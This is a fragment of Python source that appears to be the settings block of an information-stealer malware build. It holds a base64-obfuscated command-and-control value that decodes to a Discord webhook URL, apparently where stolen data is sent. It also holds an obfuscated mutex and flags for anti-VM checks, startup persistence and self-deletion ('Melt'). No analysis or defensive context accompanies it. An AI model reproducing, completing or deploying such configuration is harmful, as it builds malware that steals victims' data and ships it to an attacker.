...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzA1MjkzODY5NDg4OTQ3Mi9PaXgzTTBZaUtBcWlfWlFfWFVGaGptXy04Z3ZUYUNUNy16MnZURUY1WXE2ZzBGU0MzS2ZWV0l6bDNLNnB0VHZ4Z3lNVg==').decode())
    Mutex = base64.b64decode('WVltZmFhSHFOQ09DekNFaw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
